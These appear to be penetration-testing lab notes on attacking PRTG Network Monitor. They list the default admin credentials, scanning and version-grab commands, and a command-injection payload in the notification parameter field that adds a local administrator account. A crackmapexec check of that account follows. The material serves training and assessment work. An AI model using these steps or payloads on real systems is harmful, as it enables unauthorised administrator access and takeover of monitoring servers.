[PRTG Network Monitor](https://www.paessler.com/prtg) is agentless network monitor software.
Default credentials: `prtgadmin:prtgadmin`
# Footprinting
```bash
sudo nmap -sV -p- --open -T4 10.129.201.50

# Common Ports 80, 443, 8080
```
``Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detected on port 8080.`

One can also use `eyewitness` on this page.
`http://10.129.201.50:8080/index.htm`

Finding the version number `curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version`

# Attacking Leveraging known Vulnerabilities
[Article on Vulnerabilities](https://www.codewatch.org/blog/?p=453)
When creating a new notification, the `Parameter` field is passed directly into a PowerShell script without any type of input sanitization.

Starting, got to `Setup` in the top right then `Account Settings` then `Notifications`
![[PRTG Network Monitor-SS-1.png]]
Then you can `Add new Notification`
Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the `Save` button.

Using the `Test` button will run the program then.
`sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!`
